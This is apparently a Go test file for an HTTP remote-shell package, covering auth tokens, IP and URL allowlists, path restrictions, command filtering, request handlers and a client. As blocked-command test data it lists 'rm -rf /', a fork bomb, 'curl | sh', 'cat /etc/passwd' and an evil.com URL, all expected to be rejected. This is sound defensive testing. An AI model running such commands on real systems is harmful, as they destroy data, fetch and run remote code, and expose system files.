/* Copyright (c) 2026 Security Research */
package httpshell

import (
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
)

func TestNormalizeAuthID(t *testing.T) {
	tests := []struct {
		name   string
		authID string
		want   string
	}{
		{name: "lowercase", authID: "abc123", want: "ABC123"},
		{name: "with dashes", authID: "AB-CD-EF", want: "ABCDEF"},
		{name: "mixed", authID: "ab-cd-12", want: "ABCD12"},
		{name: "already normalized", authID: "ABC123", want: "ABC123"},
		{name: "empty", authID: "", want: ""},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := NormalizeAuthID(tt.authID)
			if got != tt.want {
				t.Errorf("NormalizeAuthID(%q) = %q, want %q", tt.authID, got, tt.want)
			}
		})
	}
}

func TestIsAllowedIP(t *testing.T) {
	tests := []struct {
		name string
		addr string
		want bool
	}{
		{name: "loopback ipv4", addr: "127.0.0.1:8080", want: true},
		{name: "loopback ipv6", addr: "::1", want: true},
		{name: "allowed range start", addr: "192.168.15.100:443", want: true},
		{name: "allowed range end", addr: "192.168.15.109:443", want: true},
		{name: "allowed range mid", addr: "192.168.15.105:443", want: true},
		{name: "outside range", addr: "192.168.15.110:443", want: false},
		{name: "random ip", addr: "10.0.0.1:80", want: false},
		{name: "no port loopback", addr: "127.0.0.1", want: true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := IsAllowedIP(tt.addr)
			if got != tt.want {
				t.Errorf("IsAllowedIP(%q) = %v, want %v", tt.addr, got, tt.want)
			}
		})
	}
}

func TestIsAllowedURL(t *testing.T) {
	tests := []struct {
		name string
		url  string
		want bool
	}{
		{name: "localhost", url: "https://localhost:8080/path", want: true},
		{name: "loopback", url: "https://127.0.0.1:8080", want: true},
		{name: "allowed ip", url: "https://192.168.15.100:443", want: true},
		{name: "disallowed", url: "https://evil.com/path", want: false},
		{name: "http scheme", url: "http://localhost", want: true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := IsAllowedURL(tt.url)
			if got != tt.want {
				t.Errorf("IsAllowedURL(%q) = %v, want %v", tt.url, got, tt.want)
			}
		})
	}
}

func TestIsCommandAllowed(t *testing.T) {
	tests := []struct {
		name    string
		command string
		want    bool
	}{
		{name: "safe command", command: "ls -la", want: true},
		{name: "rm -rf /", command: "rm -rf /", want: false},
		{name: "fork bomb", command: ":(){:|:&};:", want: false},
		{name: "curl pipe sh", command: "curl | sh", want: false},
		{name: "forbidden path /etc", command: "cat /etc/passwd", want: false},
		{name: "python -c", command: "python -c 'import os'", want: false},
		{name: "safe echo", command: "echo hello", want: true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, reason := IsCommandAllowed(tt.command)
			if got != tt.want {
				t.Errorf("IsCommandAllowed(%q) = %v (%s), want %v", tt.command, got, reason, tt.want)
			}
		})
	}
}

func TestIsAllowedPath(t *testing.T) {
	tests := []struct {
		name string
		path string
		want bool
	}{
		{name: "home dir", path: "/home/user", want: true},
		{name: "home subdir", path: "/home/user/docs", want: true},
		{name: "c users", path: "c:/users/john", want: true},
		{name: "c windows", path: "c:/windows/system32", want: false},
		{name: "root", path: "/root", want: false},
		{name: "etc", path: "/etc", want: false},
		{name: "b drive", path: "b:/data", want: true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := IsAllowedPath(tt.path)
			if got != tt.want {
				t.Errorf("IsAllowedPath(%q) = %v, want %v", tt.path, got, tt.want)
			}
		})
	}
}

func TestTruncate(t *testing.T) {
	tests := []struct {
		name   string
		s      string
		maxLen int
		want   string
	}{
		{name: "short string", s: "hello", maxLen: 10, want: "hello"},
		{name: "exact length", s: "hello", maxLen: 5, want: "hello"},
		{name: "truncated", s: "hello world test", maxLen: 10, want: "...ld test"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := Truncate(tt.s, tt.maxLen)
			if got != tt.want {
				t.Errorf("Truncate(%q, %d) = %q, want %q", tt.s, tt.maxLen, got, tt.want)
			}
		})
	}
}

func TestIsAbsPath(t *testing.T) {
	tests := []struct {
		name string
		path string
		want bool
	}{
		{name: "relative", path: "relative/path", want: false},
		{name: "empty", path: "", want: false},
	}

	if runtime.GOOS == "windows" {
		tests = append(tests, struct {
			name string
			path string
			want bool
		}{name: "windows absolute", path: `C:\Users\test`, want: true})
	} else {
		tests = append(tests, struct {
			name string
			path string
			want bool
		}{name: "unix absolute", path: "/home/user", want: true})
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := IsAbsPath(tt.path)
			if got != tt.want {
				t.Errorf("IsAbsPath(%q) = %v, want %v", tt.path, got, tt.want)
			}
		})
	}
}

func TestJoinPath(t *testing.T) {
	var tests []struct {
		name string
		base string
		rel  string
		want string
	}

	if runtime.GOOS == "windows" {
		tests = append(tests, struct {
			name string
			base string
			rel  string
			want string
		}{name: "windows paths", base: `C:\Users\test`, rel: "docs", want: `C:\Users\test\docs`})
	} else {
		tests = append(tests, struct {
			name string
			base string
			rel  string
			want string
		}{name: "unix paths", base: "/home/user", rel: "docs", want: "/home/user/docs"})
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := JoinPath(tt.base, tt.rel)
			if got != tt.want {
				t.Errorf("JoinPath(%q, %q) = %q, want %q", tt.base, tt.rel, got, tt.want)
			}
		})
	}
}

func TestGenerateAuthID(t *testing.T) {
	id := GenerateAuthID()

	// Must be exactly 32 characters — the old 6-char token was brute-forceable.
	const wantLen = 32
	if len(id) != wantLen {
		t.Errorf("GenerateAuthID() length = %d, want %d", len(id), wantLen)
	}

	// Every character must come from the documented alphabet.
	const validChars = "23456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz"
	for _, c := range id {
		if !strings.ContainsRune(validChars, c) {
			t.Errorf("GenerateAuthID() contains character %q not in allowed alphabet", c)
		}
	}

	// Two calls should produce different IDs (probability of collision is ~1/57^32).
	id2 := GenerateAuthID()
	if id == id2 {
		t.Error("GenerateAuthID() produced identical tokens on consecutive calls — entropy failure")
	}
}

func TestGenerateSelfSignedCert(t *testing.T) {
	dir := t.TempDir()
	certPath := filepath.Join(dir, "cert.pem")
	keyPath := filepath.Join(dir, "key.pem")

	err := GenerateSelfSignedCert(certPath, keyPath)
	if err != nil {
		t.Fatalf("GenerateSelfSignedCert() error: %v", err)
	}

	// Verify files exist and are non-empty
	for _, p := range []string{certPath, keyPath} {
		info, err := os.Stat(p)
		if err != nil {
			t.Errorf("file %s not created: %v", filepath.Base(p), err)
		} else if info.Size() == 0 {
			t.Errorf("file %s is empty", filepath.Base(p))
		}
	}
}

func TestMustGetwd(t *testing.T) {
	wd := MustGetwd()
	if wd == "" {
		t.Error("MustGetwd() returned empty string")
	}
}

func TestGetLocalIPs(t *testing.T) {
	ips := GetLocalIPs()
	// Just verify it doesn't panic; may return empty on some CI
	_ = ips
}

func TestNewClient(t *testing.T) {
	tests := []struct {
		name      string
		serverURL string
		authID    string
	}{
		{name: "basic client", serverURL: "https://localhost:8080", authID: "ABC123"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			client := NewClient(tt.serverURL, tt.authID)
			if client == nil {
				t.Fatal("NewClient() returned nil")
			}
			if client.ServerURL != tt.serverURL {
				t.Errorf("client.ServerURL = %q, want %q", client.ServerURL, tt.serverURL)
			}
			if client.AuthID != tt.authID {
				t.Errorf("client.AuthID = %q, want %q", client.AuthID, tt.authID)
			}
			if client.HTTPClient == nil {
				t.Error("client.HTTPClient is nil")
			}
		})
	}
}

// newTestServer builds a minimal Server suitable for handler unit tests.
// WorkDir is set under an IsAllowedPath-approved prefix.
func newTestServer(t *testing.T) *Server {
	t.Helper()

	var baseDir, shell string
	var shellArgs []string

	if runtime.GOOS == "windows" {
		// Use user home dir (under C:\Users) which IsAllowedPath permits.
		home, err := os.UserHomeDir()
		if err != nil {
			t.Fatalf("newTestServer: %v", err)
		}
		baseDir = home
		shell = "cmd.exe"
		shellArgs = []string{"/C"}
	} else {
		baseDir = "/home/dyam"
		shell = "/bin/sh"
		shellArgs = []string{"-c"}
	}

	dir, err := os.MkdirTemp(baseDir, "httpshell-test-*")
	if err != nil {
		t.Fatalf("newTestServer: failed to create workdir under %s: %v", baseDir, err)
	}

	t.Cleanup(func() { _ = os.RemoveAll(dir) })

	return &Server{
		AuthID:    "ABC123",
		Shell:     shell,
		ShellArgs: shellArgs,
		WorkDir:   dir,
	}
}

func TestHandleHealth(t *testing.T) {
	s := newTestServer(t)

	req := httptest.NewRequest(http.MethodGet, "/health", nil)
	rec := httptest.NewRecorder()

	s.HandleHealth(rec, req)

	if rec.Code != http.StatusOK {
		t.Errorf("HandleHealth status = %d, want %d", rec.Code, http.StatusOK)
	}

	var body map[string]string
	if err := json.NewDecoder(rec.Body).Decode(&body); err != nil {
		t.Fatalf("HandleHealth response is not valid JSON: %v", err)
	}

	if body["status"] != "ok" {
		t.Errorf("HandleHealth status field = %q, want %q", body["status"], "ok")
	}
}

func TestHandleInfo(t *testing.T) {
	s := newTestServer(t)
	s.Shell = "/bin/sh"

	req := httptest.NewRequest(http.MethodGet, "/", nil)
	rec := httptest.NewRecorder()

	s.HandleInfo(rec, req)

	if rec.Code != http.StatusOK {
		t.Errorf("HandleInfo status = %d, want %d", rec.Code, http.StatusOK)
	}

	var info ServerInfo
	if err := json.NewDecoder(rec.Body).Decode(&info); err != nil {
		t.Fatalf("HandleInfo response is not valid JSON: %v", err)
	}

	if info.Shell == "" {
		t.Error("HandleInfo shell field is empty")
	}

	if info.Hostname == "" {
		t.Error("HandleInfo hostname field is empty")
	}

	if info.WorkDir == "" {
		t.Error("HandleInfo workdir field is empty")
	}

	if info.Version == "" {
		t.Error("HandleInfo version field is empty")
	}
}

func TestHandleInfo_NotFound(t *testing.T) {
	s := newTestServer(t)

	req := httptest.NewRequest(http.MethodGet, "/notroot", nil)
	rec := httptest.NewRecorder()

	s.HandleInfo(rec, req)

	if rec.Code != http.StatusNotFound {
		t.Errorf("HandleInfo on non-root path status = %d, want %d", rec.Code, http.StatusNotFound)
	}
}

func TestHandleExec(t *testing.T) {
	s := newTestServer(t)

	body := `{"command":"echo hello"}`
	req := httptest.NewRequest(http.MethodPost, "/exec", strings.NewReader(body))
	rec := httptest.NewRecorder()

	s.HandleExec(rec, req)

	if rec.Code != http.StatusOK {
		t.Errorf("HandleExec status = %d, want %d", rec.Code, http.StatusOK)
	}

	var resp CommandResponse
	if err := json.NewDecoder(rec.Body).Decode(&resp); err != nil {
		t.Fatalf("HandleExec response is not valid JSON: %v", err)
	}

	if !strings.Contains(resp.Output, "hello") {
		t.Errorf("HandleExec output = %q, want it to contain %q", resp.Output, "hello")
	}

	if resp.ExitCode != 0 {
		t.Errorf("HandleExec exit_code = %d, want 0", resp.ExitCode)
	}

	if resp.Command != "echo hello" {
		t.Errorf("HandleExec command = %q, want %q", resp.Command, "echo hello")
	}
}

func TestHandleExec_EmptyCommand(t *testing.T) {
	s := newTestServer(t)

	body := `{"command":""}`
	req := httptest.NewRequest(http.MethodPost, "/exec", strings.NewReader(body))
	rec := httptest.NewRecorder()

	s.HandleExec(rec, req)

	if rec.Code != http.StatusBadRequest {
		t.Errorf("HandleExec empty command status = %d, want %d", rec.Code, http.StatusBadRequest)
	}

	var apiErr APIError
	if err := json.NewDecoder(rec.Body).Decode(&apiErr); err != nil {
		t.Fatalf("HandleExec error response is not valid JSON: %v", err)
	}

	if apiErr.Code != "INVALID_REQUEST" {
		t.Errorf("HandleExec error code = %q, want %q", apiErr.Code, "INVALID_REQUEST")
	}
}

func TestHandleExec_MethodNotAllowed(t *testing.T) {
	s := newTestServer(t)

	req := httptest.NewRequest(http.MethodGet, "/exec", nil)
	rec := httptest.NewRecorder()

	s.HandleExec(rec, req)

	if rec.Code != http.StatusMethodNotAllowed {
		t.Errorf("HandleExec GET status = %d, want %d", rec.Code, http.StatusMethodNotAllowed)
	}
}

func TestHandleExec_ForbiddenCommand(t *testing.T) {
	s := newTestServer(t)

	body := `{"command":"rm -rf /"}`
	req := httptest.NewRequest(http.MethodPost, "/exec", strings.NewReader(body))
	rec := httptest.NewRecorder()

	s.HandleExec(rec, req)

	if rec.Code != http.StatusForbidden {
		t.Errorf("HandleExec forbidden command status = %d, want %d", rec.Code, http.StatusForbidden)
	}

	var apiErr APIError
	if err := json.NewDecoder(rec.Body).Decode(&apiErr); err != nil {
		t.Fatalf("HandleExec error response is not valid JSON: %v", err)
	}

	if apiErr.Code != "COMMAND_FORBIDDEN" {
		t.Errorf("HandleExec error code = %q, want %q", apiErr.Code, "COMMAND_FORBIDDEN")
	}
}

func TestHandleCD(t *testing.T) {
	s := newTestServer(t)

	var baseDir string
	if runtime.GOOS == "windows" {
		home, err := os.UserHomeDir()
		if err != nil {
			t.Fatalf("UserHomeDir: %v", err)
		}
		baseDir = home
	} else {
		baseDir = "/home/dyam"
	}
	targetDir, err := os.MkdirTemp(baseDir, "httpshell-cd-*")
	if err != nil {
		t.Fatalf("TestHandleCD: failed to create target dir: %v", err)
	}

	t.Cleanup(func() { _ = os.RemoveAll(targetDir) })

	body := fmt.Sprintf(`{"path":%q}`, targetDir)
	req := httptest.NewRequest(http.MethodPost, "/cd", strings.NewReader(body))
	rec := httptest.NewRecorder()

	s.HandleCD(rec, req)

	if rec.Code != http.StatusOK {
		t.Errorf("HandleCD status = %d, want %d", rec.Code, http.StatusOK)
	}

	var result map[string]string
	if err := json.NewDecoder(rec.Body).Decode(&result); err != nil {
		t.Fatalf("HandleCD response is not valid JSON: %v", err)
	}

	if result["workdir"] != targetDir {
		t.Errorf("HandleCD workdir = %q, want %q", result["workdir"], targetDir)
	}

	if s.WorkDir != targetDir {
		t.Errorf("HandleCD did not update s.WorkDir: got %q, want %q", s.WorkDir, targetDir)
	}
}

func TestHandleCD_InvalidPath(t *testing.T) {
	s := newTestServer(t)

	body := `{"path":"/home/nonexistent-path-xyz-123"}`
	req := httptest.NewRequest(http.MethodPost, "/cd", strings.NewReader(body))
	rec := httptest.NewRecorder()

	s.HandleCD(rec, req)

	if rec.Code != http.StatusNotFound {
		t.Errorf("HandleCD invalid path status = %d, want %d", rec.Code, http.StatusNotFound)
	}

	var apiErr APIError
	if err := json.NewDecoder(rec.Body).Decode(&apiErr); err != nil {
		t.Fatalf("HandleCD error response is not valid JSON: %v", err)
	}

	if apiErr.Code != "DIR_NOT_FOUND" {
		t.Errorf("HandleCD error code = %q, want %q", apiErr.Code, "DIR_NOT_FOUND")
	}
}

func TestHandleCD_MethodNotAllowed(t *testing.T) {
	s := newTestServer(t)

	req := httptest.NewRequest(http.MethodGet, "/cd", nil)
	rec := httptest.NewRecorder()

	s.HandleCD(rec, req)

	if rec.Code != http.StatusMethodNotAllowed {
		t.Errorf("HandleCD GET status = %d, want %d", rec.Code, http.StatusMethodNotAllowed)
	}
}

func TestHandleHistory(t *testing.T) {
	s := newTestServer(t)

	// Execute a command to populate history.
	execBody := `{"command":"echo history-test"}`
	execReq := httptest.NewRequest(http.MethodPost, "/exec", strings.NewReader(execBody))
	execRec := httptest.NewRecorder()
	s.HandleExec(execRec, execReq)

	req := httptest.NewRequest(http.MethodGet, "/history", nil)
	rec := httptest.NewRecorder()
	s.HandleHistory(rec, req)

	if rec.Code != http.StatusOK {
		t.Errorf("HandleHistory status = %d, want %d", rec.Code, http.StatusOK)
	}

	var history []CommandResponse
	if err := json.NewDecoder(rec.Body).Decode(&history); err != nil {
		t.Fatalf("HandleHistory response is not valid JSON: %v", err)
	}

	if len(history) == 0 {
		t.Fatal("HandleHistory returned empty history after executing a command")
	}

	if history[0].Command != "echo history-test" {
		t.Errorf("HandleHistory[0].Command = %q, want %q", history[0].Command, "echo history-test")
	}
}

func TestDetectShell(t *testing.T) {
	s := &Server{}
	s.DetectShell()

	if s.Shell == "" {
		t.Error("DetectShell() left Shell empty")
	}

	if len(s.ShellArgs) == 0 {
		t.Error("DetectShell() left ShellArgs empty")
	}
}

func TestWriteError(t *testing.T) {
	s := newTestServer(t)

	rec := httptest.NewRecorder()
	s.WriteError(rec, http.StatusBadRequest, "TEST_CODE", "test message", "test details")

	if rec.Code != http.StatusBadRequest {
		t.Errorf("WriteError status = %d, want %d", rec.Code, http.StatusBadRequest)
	}

	if ct := rec.Header().Get("Content-Type"); ct != "application/json" {
		t.Errorf("WriteError Content-Type = %q, want %q", ct, "application/json")
	}

	var apiErr APIError
	if err := json.NewDecoder(rec.Body).Decode(&apiErr); err != nil {
		t.Fatalf("WriteError response is not valid JSON: %v", err)
	}

	if apiErr.Code != "TEST_CODE" {
		t.Errorf("WriteError code = %q, want %q", apiErr.Code, "TEST_CODE")
	}

	if apiErr.Message != "test message" {
		t.Errorf("WriteError message = %q, want %q", apiErr.Message, "test message")
	}

	if apiErr.Details != "test details" {
		t.Errorf("WriteError details = %q, want %q", apiErr.Details, "test details")
	}
}

func TestLog(t *testing.T) {
	s := newTestServer(t)
	// Verify Log does not panic with various inputs.
	s.Log("INFO", "simple message")
	s.Log("ERROR", "formatted %s %d", "value", 42)
	s.Log("WARN", "")
}

func TestWithMiddleware_ValidAuth(t *testing.T) {
	s := newTestServer(t)

	called := false
	handler := s.WithMiddleware(func(w http.ResponseWriter, r *http.Request) {
		called = true
		w.WriteHeader(http.StatusOK)
	})

	req := httptest.NewRequest(http.MethodGet, "/", nil)
	req.RemoteAddr = "127.0.0.1:1234"
	req.Header.Set("X-Auth-ID", "ABC123")
	rec := httptest.NewRecorder()

	handler(rec, req)

	if !called {
		t.Error("WithMiddleware did not call next handler for valid auth")
	}

	if rec.Code != http.StatusOK {
		t.Errorf("WithMiddleware valid auth status = %d, want %d", rec.Code, http.StatusOK)
	}
}

func TestWithMiddleware_InvalidAuth(t *testing.T) {
	s := newTestServer(t)

	called := false
	handler := s.WithMiddleware(func(w http.ResponseWriter, r *http.Request) {
		called = true
	})

	req := httptest.NewRequest(http.MethodGet, "/", nil)
	req.RemoteAddr = "127.0.0.1:1234"
	req.Header.Set("X-Auth-ID", "WRONG1")
	rec := httptest.NewRecorder()

	handler(rec, req)

	if called {
		t.Error("WithMiddleware called next handler despite invalid auth")
	}

	if rec.Code != http.StatusUnauthorized {
		t.Errorf("WithMiddleware invalid auth status = %d, want %d", rec.Code, http.StatusUnauthorized)
	}
}

func TestWithMiddleware_MissingAuth(t *testing.T) {
	s := newTestServer(t)

	called := false
	handler := s.WithMiddleware(func(w http.ResponseWriter, r *http.Request) {
		called = true
	})

	req := httptest.NewRequest(http.MethodGet, "/", nil)
	req.RemoteAddr = "127.0.0.1:1234"
	// No X-Auth-ID header set.
	rec := httptest.NewRecorder()

	handler(rec, req)

	if called {
		t.Error("WithMiddleware called next handler despite missing auth")
	}

	if rec.Code != http.StatusUnauthorized {
		t.Errorf("WithMiddleware missing auth status = %d, want %d", rec.Code, http.StatusUnauthorized)
	}
}

func TestWithMiddleware_ForbiddenIP(t *testing.T) {
	s := newTestServer(t)

	called := false
	handler := s.WithMiddleware(func(w http.ResponseWriter, r *http.Request) {
		called = true
	})

	req := httptest.NewRequest(http.MethodGet, "/", nil)
	req.RemoteAddr = "10.0.0.99:1234"
	req.Header.Set("X-Auth-ID", "ABC123")
	rec := httptest.NewRecorder()

	handler(rec, req)

	if called {
		t.Error("WithMiddleware called next handler despite forbidden IP")
	}

	if rec.Code != http.StatusForbidden {
		t.Errorf("WithMiddleware forbidden IP status = %d, want %d", rec.Code, http.StatusForbidden)
	}
}

func TestClient_GetServerInfo(t *testing.T) {
	expected := ServerInfo{
		Version:  Version,
		Platform: "linux",
		Arch:     "amd64",
		Hostname: "testhost",
		Shell:    "/bin/sh",
		WorkDir:  "/home/user",
		Uptime:   "1m0s",
	}

	mockServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(expected)
	}))
	defer mockServer.Close()

	client := &Client{
		ServerURL:  mockServer.URL,
		AuthID:     "ABC123",
		HTTPClient: mockServer.Client(),
	}

	info, err := client.GetServerInfo()
	if err != nil {
		t.Fatalf("GetServerInfo() error: %v", err)
	}

	if info.Hostname != expected.Hostname {
		t.Errorf("GetServerInfo hostname = %q, want %q", info.Hostname, expected.Hostname)
	}

	if info.Shell != expected.Shell {
		t.Errorf("GetServerInfo shell = %q, want %q", info.Shell, expected.Shell)
	}

	if info.WorkDir != expected.WorkDir {
		t.Errorf("GetServerInfo workdir = %q, want %q", info.WorkDir, expected.WorkDir)
	}
}

func TestClient_GetServerInfo_ErrorResponse(t *testing.T) {
	mockServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusUnauthorized)
		_ = json.NewEncoder(w).Encode(APIError{Code: "AUTH_REQUIRED", Message: "Authentication required"})
	}))
	defer mockServer.Close()

	client := &Client{
		ServerURL:  mockServer.URL,
		AuthID:     "WRONG1",
		HTTPClient: mockServer.Client(),
	}

	_, err := client.GetServerInfo()
	if err == nil {
		t.Fatal("GetServerInfo() expected error for 401 response, got nil")
	}

	if !strings.Contains(err.Error(), "AUTH_REQUIRED") {
		t.Errorf("GetServerInfo() error = %q, want it to contain %q", err.Error(), "AUTH_REQUIRED")
	}
}

func TestClient_ExecuteCommand(t *testing.T) {
	expected := CommandResponse{
		Command:   "echo hello",
		Output:    "hello\n",
		ExitCode:  0,
		Duration:  "1ms",
		Timestamp: "2026-02-23T00:00:00Z",
		WorkDir:   "/home/user",
	}

	mockServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost || r.URL.Path != "/exec" {
			w.WriteHeader(http.StatusNotFound)
			return
		}

		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(expected)
	}))
	defer mockServer.Close()

	client := &Client{
		ServerURL:  mockServer.URL,
		AuthID:     "ABC123",
		HTTPClient: mockServer.Client(),
	}

	result, err := client.ExecuteCommand("echo hello", "")
	if err != nil {
		t.Fatalf("ExecuteCommand() error: %v", err)
	}

	if result.Command != expected.Command {
		t.Errorf("ExecuteCommand command = %q, want %q", result.Command, expected.Command)
	}

	if result.Output != expected.Output {
		t.Errorf("ExecuteCommand output = %q, want %q", result.Output, expected.Output)
	}

	if result.ExitCode != expected.ExitCode {
		t.Errorf("ExecuteCommand exit_code = %d, want %d", result.ExitCode, expected.ExitCode)
	}
}

func TestClient_ExecuteCommand_ErrorResponse(t *testing.T) {
	mockServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusForbidden)
		_ = json.NewEncoder(w).Encode(APIError{Code: "COMMAND_FORBIDDEN", Message: "Command not allowed"})
	}))
	defer mockServer.Close()

	client := &Client{
		ServerURL:  mockServer.URL,
		AuthID:     "ABC123",
		HTTPClient: mockServer.Client(),
	}

	_, err := client.ExecuteCommand("rm -rf /", "")
	if err == nil {
		t.Fatal("ExecuteCommand() expected error for 403 response, got nil")
	}

	if !strings.Contains(err.Error(), "COMMAND_FORBIDDEN") {
		t.Errorf("ExecuteCommand() error = %q, want it to contain %q", err.Error(), "COMMAND_FORBIDDEN")
	}
}

func TestClient_ChangeDir(t *testing.T) {
	expected := map[string]string{"workdir": "/home/user/newdir"}

	mockServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost || r.URL.Path != "/cd" {
			w.WriteHeader(http.StatusNotFound)
			return
		}

		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(expected)
	}))
	defer mockServer.Close()

	client := &Client{
		ServerURL:  mockServer.URL,
		AuthID:     "ABC123",
		HTTPClient: mockServer.Client(),
	}

	newDir, err := client.ChangeDir("/home/user/newdir")
	if err != nil {
		t.Fatalf("ChangeDir() error: %v", err)
	}

	if newDir != expected["workdir"] {
		t.Errorf("ChangeDir() = %q, want %q", newDir, expected["workdir"])
	}
}

func TestClient_ChangeDir_ErrorResponse(t *testing.T) {
	mockServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusNotFound)
		_ = json.NewEncoder(w).Encode(APIError{Code: "DIR_NOT_FOUND", Message: "Directory not found"})
	}))
	defer mockServer.Close()

	client := &Client{
		ServerURL:  mockServer.URL,
		AuthID:     "ABC123",
		HTTPClient: mockServer.Client(),
	}

	_, err := client.ChangeDir("/nonexistent")
	if err == nil {
		t.Fatal("ChangeDir() expected error for 404 response, got nil")
	}

	if !strings.Contains(err.Error(), "DIR_NOT_FOUND") {
		t.Errorf("ChangeDir() error = %q, want it to contain %q", err.Error(), "DIR_NOT_FOUND")
	}
}

func TestClient_ChangeDir_NonJSONError(t *testing.T) {
	mockServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusInternalServerError)
		_, _ = w.Write([]byte("internal error"))
	}))
	defer mockServer.Close()

	client := &Client{
		ServerURL:  mockServer.URL,
		AuthID:     "ABC123",
		HTTPClient: mockServer.Client(),
	}

	_, err := client.ChangeDir("/some/path")
	if err == nil {
		t.Fatal("ChangeDir() expected error for 500 response, got nil")
	}

	if !strings.Contains(err.Error(), "HTTP 500") {
		t.Errorf("ChangeDir() error = %q, want it to contain %q", err.Error(), "HTTP 500")
	}
}

func TestClient_ShowServerInfo(t *testing.T) {
	expected := ServerInfo{
		Version:  Version,
		Platform: "linux",
		Arch:     "amd64",
		Hostname: "testhost",
		Shell:    "/bin/sh",
		WorkDir:  "/home/user",
		Uptime:   "5m0s",
	}

	mockServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(expected)
	}))
	defer mockServer.Close()

	client := &Client{
		ServerURL:  mockServer.URL,
		AuthID:     "ABC123",
		HTTPClient: mockServer.Client(),
	}

	// ShowServerInfo prints to stdout; just verify it does not return an error.
	if err := client.ShowServerInfo(); err != nil {
		t.Errorf("ShowServerInfo() error: %v", err)
	}
}

func TestClient_ShowServerInfo_Error(t *testing.T) {
	mockServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusUnauthorized)
		_ = json.NewEncoder(w).Encode(APIError{Code: "AUTH_REQUIRED", Message: "Authentication required"})
	}))
	defer mockServer.Close()

	client := &Client{
		ServerURL:  mockServer.URL,
		AuthID:     "WRONG1",
		HTTPClient: mockServer.Client(),
	}

	if err := client.ShowServerInfo(); err == nil {
		t.Error("ShowServerInfo() expected error for unauthorized response, got nil")
	}
}

func TestClient_GetServerInfo_NonJSONError(t *testing.T) {
	mockServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusServiceUnavailable)
		_, _ = w.Write([]byte("service unavailable"))
	}))
	defer mockServer.Close()

	client := &Client{
		ServerURL:  mockServer.URL,
		AuthID:     "ABC123",
		HTTPClient: mockServer.Client(),
	}

	_, err := client.GetServerInfo()
	if err == nil {
		t.Fatal("GetServerInfo() expected error for non-JSON 503, got nil")
	}

	if !strings.Contains(err.Error(), "HTTP 503") {
		t.Errorf("GetServerInfo() error = %q, want it to contain %q", err.Error(), "HTTP 503")
	}
}

func TestClient_ExecuteCommand_NonJSONError(t *testing.T) {
	mockServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusBadGateway)
		_, _ = w.Write([]byte("bad gateway"))
	}))
	defer mockServer.Close()

	client := &Client{
		ServerURL:  mockServer.URL,
		AuthID:     "ABC123",
		HTTPClient: mockServer.Client(),
	}

	_, err := client.ExecuteCommand("echo hello", "")
	if err == nil {
		t.Fatal("ExecuteCommand() expected error for non-JSON 502, got nil")
	}

	if !strings.Contains(err.Error(), "HTTP 502") {
		t.Errorf("ExecuteCommand() error = %q, want it to contain %q", err.Error(), "HTTP 502")
	}
}

func TestHandleExec_MalformedJSON(t *testing.T) {
	s := newTestServer(t)

	req := httptest.NewRequest(http.MethodPost, "/exec", strings.NewReader("{invalid json"))
	rec := httptest.NewRecorder()

	s.HandleExec(rec, req)

	if rec.Code != http.StatusBadRequest {
		t.Errorf("HandleExec malformed JSON status = %d, want %d", rec.Code, http.StatusBadRequest)
	}

	var apiErr APIError
	if err := json.NewDecoder(rec.Body).Decode(&apiErr); err != nil {
		t.Fatalf("HandleExec error response is not valid JSON: %v", err)
	}

	if apiErr.Code != "INVALID_REQUEST" {
		t.Errorf("HandleExec error code = %q, want %q", apiErr.Code, "INVALID_REQUEST")
	}
}

func TestHandleExec_ForbiddenWorkDir(t *testing.T) {
	s := newTestServer(t)

	body := `{"command":"ls","workdir":"/etc"}`
	req := httptest.NewRequest(http.MethodPost, "/exec", strings.NewReader(body))
	rec := httptest.NewRecorder()

	s.HandleExec(rec, req)

	if rec.Code != http.StatusForbidden {
		t.Errorf("HandleExec forbidden workdir status = %d, want %d", rec.Code, http.StatusForbidden)
	}

	var apiErr APIError
	if err := json.NewDecoder(rec.Body).Decode(&apiErr); err != nil {
		t.Fatalf("HandleExec error response is not valid JSON: %v", err)
	}

	if apiErr.Code != "PATH_FORBIDDEN" {
		t.Errorf("HandleExec error code = %q, want %q", apiErr.Code, "PATH_FORBIDDEN")
	}
}

// TestHandleExec_NonZeroExit moved to httpshell_{unix,windows}_test.go

